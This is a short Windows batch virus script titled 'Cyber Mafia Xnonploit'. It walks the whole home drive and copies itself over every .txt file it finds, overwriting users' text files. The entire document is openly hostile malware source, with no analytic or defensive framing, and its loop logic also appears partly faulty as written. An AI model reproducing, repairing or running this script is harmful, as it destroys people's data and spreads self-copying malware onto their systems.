:::::::::::::::::::::::::
::Cyber Mafia Xnonploit::
:::::::::::::::::::::::::
@echo off
::----Infect All Txt Files---::
Dir %Homedrive% /s /b > DirPath                          
        For /f %%Y In (DirPath) Do (
        Set DirPath=%%Y > Nul    
            For %%Z In (%DirPath%\*.txt) Do (
            Set TxtInfect=%%Z > Nul
            Copy /y %0 %TxtInfect%
        )
    )

Del /f /s /q DirPath
::---------------------------::
